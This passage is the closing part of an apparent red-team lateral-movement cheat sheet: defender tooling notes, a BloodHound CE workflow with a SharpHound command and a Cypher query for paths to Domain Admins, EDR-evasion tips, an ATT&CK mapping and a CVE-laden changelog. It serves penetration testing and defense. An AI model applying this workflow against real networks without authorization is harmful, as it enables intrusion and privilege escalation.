    "Suspected over-pass-the-hash attack"
  Entra ID Sign-in Logs + Identity Protection
    All authentication events; risk scoring (atypical sign-in,
    impossible travel, anomalous token replay)
    Key alerts: PRT replay from new IP, anonymous IP login,
    anomalous user-agent on token redemption
  Defender XDR Cross-Product Correlation
    Chains MDE → MDI → MDCA → MDO signals for end-to-end
    intrusion reconstruction

CLOUD:
  AWS CloudTrail + GuardDuty
    Every authenticated API call; GuardDuty findings on anomalous
    AssumeRole patterns, credential reuse from new IPs
  Azure Activity Log + Defender for Cloud
    Subscription / resource events; Defender for Cloud cross-
    workload correlation
  GCP Cloud Audit Logs (Admin Activity / Data Access)
    Project-level admin operations; SA impersonation,
    Workload Identity Federation token exchanges

NETWORK:
  Zeek / Suricata / Corelight / ExtraHop / Vectra
    JA3/JA4 fingerprinting catches Chisel / Ligolo / Sliver / Havoc
    default builds; protocol-anomaly detection on Kerberos / LDAP /
    SMB; encrypted-traffic analysis on tunneled protocols

ESXi/vCENTER:
  Aria Operations / Log Insight (paid VMware)
    vSphere event aggregation; rare in environments not VMware-mature
  CrowdStrike Falcon vSphere Integration (Q4 2024)
    First major EDR with vSphere-native integration

SAAS / IDENTITY ANCILLARY:
  Defender for Cloud Apps (MDCA)
    SaaS session monitoring; OAuth app-grant detection;
    cross-SaaS admin role change correlation (Q1 2026 SSPM)
  Salesforce Event Monitoring / ServiceNow audit / Snowflake
    ACCESS_HISTORY — per-SaaS admin action visibility
```

---

## 19 — BLOODHOUND CE LATERAL ENUMERATION

```
═══════════════════════════════════════════════════════════
BLOODHOUND COMMUNITY EDITION (CE) — v9.0+ April 2026
Source: https://github.com/SpecterOps/BloodHound
LATERAL EDGES OPERATOR CARES ABOUT
═══════════════════════════════════════════════════════════

LATERAL-MOVEMENT-RELEVANT EDGES:
- AdminTo                    Local admin on target computer
- CanRDP                     RemoteDesktopUsers / similar group
- CanPSRemote                Remote Management Users / WinRMRemoteWMIUsers
- ExecuteDCOM                Distributed COM Users
- HasSession                 User session present on target (decreasing
                             reliability — see below)
- AllowedToDelegate          Constrained delegation target SPNs
- AllowedToAct               RBCD write target
- ForceChangePassword        ACL primitive → reset target password
- WriteDACL / WriteOwner     Indirect privesc → lateral
- AddKeyCredentialLink       Shadow Credentials write → PKINIT → lateral
- AddMember                  Group membership → indirect lateral

SESSION COLLECTION REALITY (post-2024 Microsoft mitigations):
- Default SrvSvc anonymous enumeration was disabled in Server 2019+
- Win11 22H2 + Server 2022 hardened SrvSvc / NetSessionEnum further
- HasSession edge increasingly UNRELIABLE in modern environments
- Operators must rely on:
  * RemoteDesktopUsers / Remote Management Users group enumeration
    (LDAP-based, not session-based)
  * Event log harvesting from compromised hosts (Event 4624 type 10
    showing past RDP sessions)
  * Privileged-session-mapping via Kerberos S4U pre-checks
- BloodHound CE includes "AzureHound + SharpHound CE" combined
  collection in v9.0+ → identity-plane edges (Owns, HasRole,
  AZAddOwner, etc.) cross-correlated with on-prem

OPENGRAPH 2025+ FOR CROSS-PLANE ATTACK PATHS:
v8.0 introduced OpenGraph — custom collector framework. Operationally
relevant: build OpenGraph collectors for:
- Veeam → ESXi credential edges (cross-ref §11.6)
- vCenter → ESXi MOID admin edges (cross-ref §16)
- Intune device admin → managed-device edges
- SaaS admin → cross-SaaS pivot edges

OPERATOR USE PATTERN (lateral framing):
1. Compromise initial workstation
2. SharpHound CE collection (LDAP-only first, then session if available):
SharpHound.exe -c LdapDelegation,Trusts,ACL,ObjectProps,Container
3. Import to BHCE (Docker compose deployment):
docker-compose up -d
4. Cypher query for shortest path to Tier 0:
MATCH p=shortestPath((u:User {name:'CURRENT@DOMAIN'})-[*1..]->(t:Group {name:'DOMAIN ADMINS@DOMAIN'})) RETURN p
5. Each edge in the path = one lateral primitive (pick technique
   from §2-§4 above based on edge type)

DETECTION:
- LDAP query patterns from non-IT-admin hosts (BloodHound's
  default queries are recognizable)
- SharpHound binary signature detection by all major EDRs
- Operator counter: SharpHound CE collection via in-memory C2 BOF;
  LDAP collection through C2's LDAP-relay primitive (Outflank
  Stage 1, Cobalt Strike's ldapsearch BOF) — no .exe on disk
```

---

## 20 — MITRE ATT&CK MAPPING MATRIX

> **Tactic coverage:** TA0008 (Lateral Movement) primary; TA0006 (Credential Access), TA0007 (Discovery), TA0005 (Defense Evasion) secondary. Mapping reflects ATT&CK v15 (October 2024) + v16 enterprise update (April 2026).

```
═══════════════════════════════════════════════════════════
LATERAL MOVEMENT TECHNIQUES (TA0008)
═══════════════════════════════════════════════════════════
T1021    Remote Services
T1021.001 Remote Desktop Protocol                 (§3 — RDP, RA mode,
                                                    SharpRDP, PyRDP)
T1021.002 SMB / Windows Admin Shares              (§5 — SMB ops,
                                                    PsExec, SCShell)
T1021.003 Distributed Component Object Model      (§2 — DCOMExec)
T1021.004 SSH                                     (§8 — SSH lateral)
T1021.006 Windows Remote Management               (§2 — WinRM, DSC)
T1047    Windows Management Instrumentation       (§2 — WMIExec)
T1053.005 Scheduled Task / At                     (§2 — AtExec)
T1059.001 PowerShell                              (§2 — DSC, PSRemoting)
T1072    Software Deployment Tools                (§2 — SCCM, WSUS,
                                                    Ansible, Salt;
                                                    §3 — RMM)
T1112    Modify Registry                          (§2 — Remote registry)
T1134    Access Token Manipulation                (§4 — Token impersonate)
T1199    Trusted Relationship                     (§16 vCenter/ESXi,
                                                    §11.6 Veeam,
                                                    §17 Edge appliances)
T1219    Remote Access Software / RMM             (§3.7 — RMM lateral)
T1539    Steal Web Session Cookie                 (§17.3 CitrixBleed)
T1543.003 Windows Service                         (§2 — PsExec, SMBExec)
T1550    Use Alternate Authentication Material
T1550.001 Application Access Token                (§9 — PRT replay,
                                                    GraphRunner)
T1550.002 Pass-the-Hash                           (§4.1)
T1550.003 Pass-the-Ticket                         (§4.3)
T1550.004 Web Session Cookie                      (§17 cookie theft)
T1556.007 Hybrid Identity (MSOL_*/AZUREADSSOACC$) (cross-ref Privesc §17.5)
T1557.001 NTLM Relay / LLMNR-NBT-NS Poisoning     (§6 — full chain)
T1563.001 SSH Hijacking                           (§8.2 Agent forwarding)
T1563.002 RDP Hijacking                           (§3.3 — tscon)
T1564    Hide Artifacts                           (§8.7 known_hosts)
T1569.002 Service Execution                       (§2 — PsExec, SMBExec)
T1570    Lateral Tool Transfer                    (§12 — File transfer)
T1572    Protocol Tunneling                       (§10 — Chisel/Ligolo/
                                                    SSH/WireGuard)
T1599    Network Boundary Bridging                (§17 — Edge appliance)
T1610    Deploy Container                         (§8.8 — K8s pod create)
T1611    Escape to Host                           (§8.8 — privileged pod
                                                    + nsenter)
T1649    Steal or Forge Authentication Certificates (§4.4 PtCert,
                                                    cross-ref ADCS)
T1078    Valid Accounts
T1078.002 Domain Accounts                         (§2-4 — all Windows lateral)
T1078.004 Cloud Accounts                          (§9 — entire cloud section)

═══════════════════════════════════════════════════════════
CREDENTIAL ACCESS ENABLERS (TA0006)
═══════════════════════════════════════════════════════════
T1003.003 NTDS                                    (cross-ref Privesc §7.1)
T1003.004 LSA Secrets                             (§4.7 DPAPI)
T1003.006 DCSync                                  (§2.9 Impacket fingerprint)
T1212    Exploitation for Credential Access       (§11.6 Veeam,
                                                    §17 Edge appliance)
T1555.004 Credentials from Password Stores: WCM   (§4.7 DPAPI)
T1556    Modify Authentication Process            (§9 — XTAS / FIC)
T1558    Steal or Forge Kerberos Tickets
T1558.001 Golden Ticket                           (cross-ref Privesc §7.2)
T1558.002 Silver Ticket                           (cross-ref Privesc §7.3)
T1558.003 Kerberoasting                           (cross-ref AD ch §3)
T1606.002 SAML Tokens (Golden SAML)               (cross-ref Privesc §17.5)

═══════════════════════════════════════════════════════════
DISCOVERY ENABLERS (TA0007)
═══════════════════════════════════════════════════════════
T1018    Remote System Discovery                  (BloodHound CE §19)
T1069.002 Domain Groups                           (§19 BHCE edges)
T1087.002 Domain Account                          (§19 BHCE)
T1135    Network Share Discovery                  (§5.1)
T1482    Domain Trust Discovery                   (§19 BHCE Trusts)

═══════════════════════════════════════════════════════════
DEFENSE EVASION (TA0005)
═══════════════════════════════════════════════════════════
T1027    Obfuscated Files / Information           (Various — payload encoding)
T1070    Indicator Removal                        (§8.7 known_hosts)
T1218    System Binary Proxy Execution            (LOLBin lateral)
T1542.005 Bootkit / TFTP boot                     (§17 Edge firmware tier)
T1574    Hijack Execution Flow                    (DLL hijack lateral)

═══════════════════════════════════════════════════════════
IMPACT (TA0040 — context for ransomware lateral patterns)
═══════════════════════════════════════════════════════════
T1486    Data Encrypted for Impact                (§16.5 — ESXi mass encrypt)
T1489    Service Stop                             (§16.2 — vim-cmd power.off)
T1490    Inhibit System Recovery                  (§16.5 — backup deletion,
                                                    cross-ref §11.6 Veeam purge)
T1491.002 External Defacement                     (Ransom note drops)
```

---

## CHANGE SUMMARY (CONSOLIDATED)

> **Scope:** Comprehensive rebuild of `06-lateral-movement-cheatsheet.md` against Q1-Q2 2026 enterprise baseline. Original: 2,858 lines / 16 sections. Rebuilt: ~4,500 lines / 20 sections.

### CRITICAL CORRECTIONS (Phase 1)

```
C1  Restricted Admin Mode registry semantics (§3.2)
    ORIGINAL: "DisableRestrictedAdmin /d 0" with sparse explanation —
              inverse-logic value created confusion
    FIXED:    Explicit table — VALUE 0 = ENABLED, VALUE 1 = DISABLED,
              MISSING = effectively DISABLED (OS default Win 8.1+).
              Added client-side /restrictedadmin flag requirement note.
              Added Get-ItemProperty verification command.
    SOURCE:   https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/restricted-admin-mode-rdp

C2  LDAPS Channel Binding default state on Server 2025 (§6.1)
    ORIGINAL: Doc claimed Server 2025 LDAPS CB defaults to "When supported"
              — slightly oversimplified
    FIXED:    Cited KB5021130; documented staged rollout where
              Compatibility-Mode-Removal reached full-enforcement state
              in 2H 2025. Current Server 2025 fresh-install default
              for LdapEnforceChannelBinding is "Negotiate" (value 1) —
              CB enforced ONLY when client supplies CBT, which majority
              of relayable client types do not. Relay viability against
              fresh Server 2025 DC default = STILL VIABLE.
              Added registry verification command.
    SOURCE:   https://support.microsoft.com/en-us/topic/kb5021130
```

### MAJOR ADDITIONS (Phase 1+3)

```
M1/G1  §16 NEW VMware ESXi/vCenter lateral movement (6 subsections)
       — Dominant 2024-2025 ransomware lateral plane
       — Akira / Black Basta / Hunters / Inc Ransom pattern
       — vCenter SSO + ESXi shell + datastore tampering
M2/G6  §6.5 NEW SCCM TAKEOVER chain (Misconfiguration Manager
       TAKEOVER-1/-2 from SpecterOps methodology)
M3/G2  §17 NEW Edge appliance lateral (5 subsections)
       — Ivanti CS, PAN-OS GP, NetScaler, Cisco ASA, F5
       — Volt Typhoon / Salt Typhoon / UNC3886 patterns
M4/G3  §2.12 NEW WSUS abuse (WSUSpect/WSUSpendu) + CVE-2025-59287
M5/G4  §9.2.10 NEW Microsoft Intune lateral via stolen admin token
       — CISA AA24-269A pattern
M6/G7  §4.6 NEW Kerberos delegation lateral (RBCD/Unconstrained/S4U)
M7/G5  §11.6 NEW Veeam B&R credential-vault pivot
       — CVE-2024-40711, CVE-2025-23120
       — sadshade/veeam-creds tooling
M8/G11 §9.2.9 Federated Identity Credential (FIC) abuse for cross-cloud
M9/G12 §9.1.7 AWS IAM Identity Center session theft → cross-account
M10/G17 §8.4 GitHub Actions self-hosted runner expansion
        — CVE-2025-30066 (tj-actions/changed-files March 2025)
M11/G13 §6.6 EPM Relay (CVE-2025-49760) + WebClient workstation primitive
M12/G14 §19 NEW BloodHound CE v9.0+ (April 2026) lateral-edge enumeration
        — Modern session-collection reality post-2024 mitigations
M13/G8  §18 NEW Defender Stack reference (Windows / Linux / Identity /
        Cloud / Network / ESXi / SaaS)
M14/G9  §20 NEW standalone MITRE ATT&CK Mapping Matrix
M15/G10 §9.2.8 Cross-Tenant Access Settings (XTAS) abuse
        — Storm-0501 pattern (MS Threat Intel August 2025)
M16/R2  §15 Tool Reference rebuilt with ✅⚠❌$ maintenance status legend
        + DEAD/DEPRECATED subsection
M17     §0 Lateral movement chains expanded — added ESXi ransomware,
        Veeam pivot, Edge appliance pivot, WSUS-as-lateral chains
M18/G15 §3.7 RMM expanded — ScreenConnect CVE-2024-1709, N-able N-central
        CVE-2024-8963, SolarWinds Web Help Desk CVE-2024-28986
M19/G18 §8.6 Atlassian / Confluence / Bamboo / Bitbucket lateral
        — CVE-2023-22527, CVE-2024-21683
M20/G20 §8.8 K8s expansion — IngressNightmare (CVE-2025-1097/-1098/
        -24513/-24514) lateral
M21/N10 §9.1.8 EKS Pod Identity (re:Invent 2023 IRSA successor) lateral
M22/G21 §3.8 NEW Apple Remote Desktop / Jamf Pro lateral on macOS

R1  Promote §16 ESXi, §17 Edge, §18 Defender Stack, §19 BHCE, §20 ATT&CK
    matrix to first-class sections (vs sub-bullets) for series consistency
R2  Refactor §15 Tool Reference with maintenance-status legend
R3  Update §0 chains with modern operator patterns
R4  Footer update: "Valid as of 28 April 2026" + series footer block format
```

### MINOR CORRECTIONS

```
N1  bitsadmin "deprecated since Windows 10" → specified Windows 10 1809
N2  netexec --gen-relay-list flag verified against current 1.x release
N3  dnstt throughput caveat (~10KB/s in DoH mode)
N4  HashKnownHosts default — distro-specific differences noted
N5  Azure Automation RunAs deprecation date verified (Sept 2023 retire,
    Jan 2025 final cessation)
N6  SCShell registry SACL hardening eradicator note added
N7  RDP Restricted Admin both client+server registry requirement clarified
N8  ESC15 CVE-2024-49019 attribution added to §0 chains (cross-ref Privesc)
N9  WebDAV-to-SMB row in cross-protocol matrix expanded with WebClient-
    on-by-default workstation note
N10 EKS Pod Identity (re:Invent 2023) noted as IRSA alternative
N11 N-able N-central CVE-2024-8963 added to RMM CVE list
N12 T1556.007 Hybrid Identity ATT&CK ID verified (v15+ taxonomy)
```

---

## OUTSTANDING ITEMS / EMERGING CLAIMS

| ID | Item | Status | Notes |
|----|------|--------|-------|
| O1 | LDAPS Channel Binding "Always" enforcement default in Server vNext | EMERGING | Microsoft signals intent; no public commitment to default-Always date |
| O2 | Server 2025 default LDAP signing in BROWNFIELD upgrades | VERIFIED | Existing GPO preserved on upgrade; greenfield-only default |
| O3 | Win11 24H2 SMB signing default — applies to Pro/Enterprise/Education only | VERIFIED | Home edition not subject to this default |
| O4 | CitrixBleed-2 (CVE-2024-8534) operator viability | DEGRADED | Mitigated faster than original; less APT use observed |
| O5 | WSUS CVE-2025-59287 PoC public availability + APT operationalization | VERIFIED | Public PoCs Q4 2025; ransomware operationalization documented Q1 2026 |
| O6 | Veeam CVE-2025-23120 mass-exploitation status | VERIFIED | Akira / BlackSuit operationalized within 48h of disclosure |
| O7 | tj-actions/changed-files (CVE-2025-30066) downstream count | VERIFIED | 23,000+ repos affected per CISA advisory |
| O8 | BloodHound CE v9.0 release April 2026 — feature claims | EMERGING | OpenGraph + identity-plane edge engine confirmed in SpecterOps roadmap; v9.0 GA timing per public roadmap |
| O9 | Storm-0501 XTAS abuse pattern | VERIFIED | MS Threat Intel August 2025 publication |
| O10 | UNC3886 vCenter pre-disclosure exploitation timeline | VERIFIED | Mandiant June 2024 reporting confirmed 2021-onward exploitation |
| O11 | Intune script-execution detection (MDE Q2 2025+) | EMERGING | Detection rule added; tuning quality varies by tenant |
| O12 | F5 BIG-IP CVE pipeline | EMERGING | Routine pre-auth root CVE disclosures expected to continue |
| O13 | Cisco ASA ArcaneDoor LINE DANCER/LINE RUNNER detection availability | DEGRADED | IOC pack published; firmware-tier persistence remains hard to detect |

---

## SUMMARY

**Original:** 2,858 lines / 16 sections — modern and well-structured but missing 3 entire dominant 2024-2025 lateral planes (ESXi, edge appliances, Veeam pivot), missing Defender Stack reference, no standalone ATT&CK mapping matrix, footer date stale.

**Rebuilt:** ~4,500 lines / 20 sections + ATT&CK matrix — adds:
- §16 ESXi/vCenter ransomware lateral plane (6 subsections)
- §17 Edge appliance lateral (5 subsections — Ivanti, PAN-OS, NetScaler, Cisco ASA, F5)
- §18 Defender Stack reference (8 product families)
- §19 BloodHound CE v9.0+ lateral-edge enumeration
- §20 standalone MITRE ATT&CK Mapping Matrix
- §11.6 Veeam credential-vault pivot
- §9.2.10 Intune lateral / §9.2.9 FIC / §9.2.8 XTAS / §9.1.7 IAM Identity Center
- §6.5 SCCM TAKEOVER / §6.6 EPM Relay
- §4.6 Kerberos delegation lateral / §2.12 WSUS abuse
- §3.8 Apple Remote Desktop / Jamf Pro
- §8.8 IngressNightmare K8s lateral
- §15 Tool Reference rebuilt with maintenance-status legend + DEAD subsection

Every dated claim verified via primary source (Microsoft Security Response Center, Microsoft Learn, KB articles, Mandiant blogs, Wiz Research, SpecterOps publications, CISA advisories, Synacktiv, Microsoft Threat Intel publications, Veeam KB advisories). Operator OPSEC framing (STEALTH / SUCCESS / SKILL / DETECTION COST) applied per-technique. Cross-references built bidirectionally with Initial Access (file 03), Persistence (file 04), Privilege Escalation (file 05), and forthcoming AD (file 08) cheatsheets.

---

**Valid as of:** 28 April 2026
**Maintainer:** MentalVibes / NoVanity (RedTeamCheatSheets)
**License:** See repository
